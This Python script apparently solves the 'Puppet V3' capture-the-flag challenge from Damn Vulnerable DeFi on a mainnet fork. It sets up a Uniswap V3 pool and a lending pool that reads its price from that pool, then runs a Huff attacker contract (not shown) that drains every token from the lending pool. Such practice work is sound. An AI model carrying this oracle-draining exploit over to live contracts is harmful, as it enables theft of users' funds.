from ape import accounts, project, Contract
from eth_abi import encode
from ..utils.helper import (
    w3,
    set_balance,
    get_timestamp,
    time_travel,
    get_block,
    mine_blocks,
    get_sig,
    send_tx,
    deploy_huff_contract,
    MAX_UINT256,
)
from math import sqrt, floor

BLOCK = 15450164

# Initial liquidity amounts for Uniswap V3 Pool
UNISWAP_INITIAL_TOKEN_LIQUIDITY = w3.to_wei(100, "ether")
UNISWAP_INITIAL_WETH_LIQUIDITY = w3.to_wei(100, "ether")

ATTACKER_INITIAL_TOKEN_BALANCE = w3.to_wei(110, "ether")
ATTACKER_INITIAL_ETH_BALANCE = w3.to_wei(1, "ether")
DEPLOYER_INITIAL_ETH_BALANCE = w3.to_wei(200, "ether")

LENDING_POOL_INITIAL_TOKEN_BALANCE = w3.to_wei(1000000, "ether")


def encode_price_sqrt(reserve_1, reserve_0):
    return floor(sqrt(reserve_1 / reserve_0) * pow(2, 96))


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")
    assert (
        get_block() == BLOCK
    ), "run script with network flag => '--network :mainnet-fork'"

    # Initialize attacker account
    print("\n--- Initializing Attacker Account ---\n")
    attacker = accounts.test_accounts[1]
    set_balance(attacker, ATTACKER_INITIAL_ETH_BALANCE)
    assert attacker.balance == ATTACKER_INITIAL_ETH_BALANCE

    # Initialize deployer account
    print("\n--- Initializing Deployer Account ---\n")
    deployer = accounts.test_accounts[2]
    set_balance(deployer, DEPLOYER_INITIAL_ETH_BALANCE)
    assert deployer.balance == DEPLOYER_INITIAL_ETH_BALANCE

    print(
        f"\n--- \nOur players:\n⇒ Deployer: {deployer}\n⇒ Attacker: {attacker}\n---\n"
    )

    # get referece to the Uniswap V3 Factory Contrat
    print("\n--- Getting reference to Uniswap V3 Factory Contract ---\n")
    uniswap_factory = Contract("0x1F98431c8aD98523631AE4a59f267346ea31F984")

    # get a reference to WETH9
    print("\n--- Getting reference to WETH Contract ---\n")
    weth = Contract("0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2")

    # deployer wraps ETH in WETH
    print("\n--- Deployer is wrapping ETH in WETH ---\n")
    weth.deposit(value=UNISWAP_INITIAL_WETH_LIQUIDITY, sender=deployer)
    assert weth.balanceOf(deployer) == UNISWAP_INITIAL_WETH_LIQUIDITY

    # Deploy DVT token. This is the token to be traded against WETH in the Uniswap v3 pool.
    print("\n--- Deploying Token ---\n")
    token = project.DamnValuableToken.deploy(sender=deployer)

    # Create the Uniswap V3 Pool
    print("\n--- Creating Uniswap V3 Pool ---\n")
    uniswap_position_manager = Contract("0xC36442b4a4522E871399CD717aBDD847Ab11FE88")
    FEE = 3000  # 0.3%
    uniswap_position_manager.createAndInitializePoolIfNecessary(
        weth,  # token0
        token,  # token1
        FEE,
        encode_price_sqrt(1, 1),
        sender=deployer,
    )
    uniswap_pool_address = uniswap_factory.getPool(
        weth,
        token,
        FEE,
    )
    uniswap_pool = project.IUniswapV3Pool.at(uniswap_pool_address)
    uniswap_pool.increaseObservationCardinalityNext(40, sender=deployer)

    # Deployer adds liquidity at current price to Uniswap V3 exchange
    print("\n--- Deployer is adding liquidity to Pool ---\n")
    weth.approve(
        uniswap_position_manager,
        MAX_UINT256,
        sender=deployer,
    )
    token.approve(
        uniswap_position_manager,
        MAX_UINT256,
        sender=deployer,
    )
    uniswap_position_manager.mint(
        (
            weth,
            token,
            FEE,
            -60,
            60,
            UNISWAP_INITIAL_WETH_LIQUIDITY,
            UNISWAP_INITIAL_TOKEN_LIQUIDITY,
            0,
            0,
            deployer,
            get_timestamp() * 2,
        ),
        sender=deployer,
    )

    # Deploy the lending pool
    print("\n--- Deploying Lending Pool ---\n")
    lending_pool = project.PuppetV3Pool.deploy(
        weth,
        token,
        uniswap_pool,
        sender=deployer,
    )
    # Setup initial token balances of lending pool and Attacker
    print("\n--- Setting initial token balances for lending pool and attacker ---\n")
    token.transfer(
        attacker,
        ATTACKER_INITIAL_TOKEN_BALANCE,
        sender=deployer,
    )
    token.transfer(
        lending_pool,
        LENDING_POOL_INITIAL_TOKEN_BALANCE,
        sender=deployer,
    )

    # some time passes
    print("\n--- 3 days pass ... ---\n")
    time_travel(3 * 24 * 60 * 60)  # 3 days in seconds

    # Ensure oracle in lending pool is working as expected. At this point, DVT/WETH price should be 1:1.
    # To borrow 1 DVT, must deposit 3 ETH
    print("\n--- Ensuring Oracle in Lending Pool is working as expected ---\n")
    assert lending_pool.calculateDepositOfWETHRequired(
        w3.to_wei(1, "ether")
    ) == w3.to_wei(3, "ether")

    # To borrow all DVT in lending pool, user must deposit three times its value
    assert (
        lending_pool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)
        == LENDING_POOL_INITIAL_TOKEN_BALANCE * 3
    )
    # Ensure player doesn't have that much ETH
    assert attacker.balance < LENDING_POOL_INITIAL_TOKEN_BALANCE * 3

    initial_block_timestamp = get_timestamp()

    # define initial balances for the pool and attacker
    pool_initial_bal = token.balanceOf(lending_pool) / 10**18
    attacker_initial_bal = token.balanceOf(attacker) / 10**18

    print(
        f"\n--- \nInitial Balances:\n⇒ Pool: {pool_initial_bal}\n⇒ Attacker: {attacker_initial_bal}\n---\n"
    )

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    swap_router_address = "0xE592427A0AEce92De3Edee1F18E0157C05861564"

    attacker_contract = deploy_huff_contract(
        "PuppetV3Attacker.huff",
        encode(
            [
                "address",
                "address",
                "address",
                "address",
            ],
            [
                swap_router_address,
                lending_pool.address,
                token.address,
                weth.address,
            ],
        ),
        attacker,
    )
    token.transfer(attacker_contract, token.balanceOf(attacker), sender=attacker)

    send_tx(attacker, attacker_contract, get_sig("start_attack()"))

    mine_blocks(110)

    send_tx(attacker, attacker_contract, get_sig("finish_attack()"))

    # --- AFTER EXPLOIT --- #
    print("\n--- After exploit: Attacker has stolen all the tokens in the pool ---\n")

    pool_ending_bal = token.balanceOf(lending_pool) / 10**18
    attacker_ending_bal = token.balanceOf(attacker) / 10**18

    print(
        f"\n--- \nEnding Balances:\n⇒ Pool: {pool_ending_bal}\n⇒ Attacker: {attacker_ending_bal}\n---\n"
    )

    # block timestamp must not have changed too much
    assert get_timestamp() - initial_block_timestamp < 115

    # attacker has taken all tokens out of pool
    assert token.balanceOf(lending_pool) == 0
    assert token.balanceOf(attacker) >= LENDING_POOL_INITIAL_TOKEN_BALANCE

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
